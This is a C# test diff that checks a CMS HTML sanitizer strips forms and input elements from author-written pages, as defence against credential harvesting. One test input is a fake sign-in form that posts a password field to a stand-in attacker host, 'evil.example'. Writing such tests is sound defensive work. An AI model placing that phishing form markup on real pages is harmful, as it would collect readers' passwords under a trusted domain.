@@ -37,6 +37,34 @@ public sealed class CmsMarkupSanitizerTests
         Assert.DoesNotContain(mustNotSurvive, cleaned, StringComparison.OrdinalIgnoreCase);
     }
 
+    /// <summary>
+    /// No page anybody can author may contain a form or an input, in any shape.
+    /// </summary>
+    /// <remarks>
+    /// Ben's rule: forms and inputs exist on our pages only where our own code put them. A form
+    /// authored into a CMS page renders on our domain under an organization's name, and a reader
+    /// has no way to tell it from a real one — which makes it a credential-harvesting shape whether
+    /// or not that was the intent. Anything collecting from a reader has to be a feature with an
+    /// endpoint we wrote.
+    /// </remarks>
+    [Theory]
+    [InlineData("""<form action="https://evil.example" method="post"><input name="password" type="password"><button>Sign in</button></form>""")]
+    [InlineData("""<input type="text" name="card">""")]
+    [InlineData("""<select name="x"><option>1</option></select>""")]
+    [InlineData("""<textarea name="notes"></textarea>""")]
+    [InlineData("""<fieldset><legend>Details</legend><label>Name</label></fieldset>""")]
+    public void No_authored_page_may_carry_a_form_or_an_input(string markup)
+    {
+        var cleaned = Sanitizer.SanitizeHtml(markup);
+
+        foreach (var tag in new[] { "<form", "<input", "<select", "<textarea", "<fieldset", "<legend", "<label" })
+            Assert.DoesNotContain(tag, cleaned, StringComparison.OrdinalIgnoreCase);
+
+        // And nothing that would post somewhere either.
+        Assert.DoesNotContain("action=", cleaned, StringComparison.OrdinalIgnoreCase);
+        Assert.DoesNotContain("evil.example", cleaned, StringComparison.OrdinalIgnoreCase);
+    }
+
     [Fact]
     public void Ordinary_text_around_a_removed_script_is_kept()
     {
